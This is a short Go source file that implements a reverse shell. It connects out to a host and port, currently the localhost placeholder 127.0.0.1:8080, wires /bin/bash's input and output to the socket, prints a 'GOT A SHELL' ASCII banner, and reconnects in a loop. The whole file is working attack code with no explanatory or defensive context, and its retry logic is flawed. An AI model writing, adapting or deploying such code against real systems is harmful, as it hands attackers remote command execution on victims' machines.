package main

import (
	"fmt"
	"net"
	"os/exec"
	"time"
)

func reverse_shell(host string, port string) {
	connection, err := net.Dial("tcp", host+":"+port)
	if nil != err {
		time.Sleep(5 * time.Second)
		reverse_shell(host, port)
	}

	// Uses /bin/sh & get
	cmd := exec.Command("/bin/bash")

	//Get user instructions
	cmd.Stdin, cmd.Stdout, cmd.Stderr = connection, connection, connection

	// Start connection
	fmt.Println("\n██████╗  ██████╗ ████████╗     █████╗     ███████╗██╗  ██╗███████╗██╗     ██╗     \n██╔════╝ ██╔═══██╗╚══██╔══╝    ██╔══██╗    ██╔════╝██║  ██║██╔════╝██║     ██║     \n██║  ███╗██║   ██║   ██║       ███████║    ███████╗███████║█████╗  ██║     ██║     \n██║   ██║██║   ██║   ██║       ██╔══██║    ╚════██║██╔══██║██╔══╝  ██║     ██║     \n╚██████╔╝╚██████╔╝   ██║       ██║  ██║    ███████║██║  ██║███████╗███████╗███████╗\n╚═════╝  ╚═════╝    ╚═╝       ╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝")
	cmd.Run()

	// Then close connection
	connection.Close()
	reverse_shell(host, port)
}

func main() {
	reverse_shell("127.0.0.1", "8080")
}
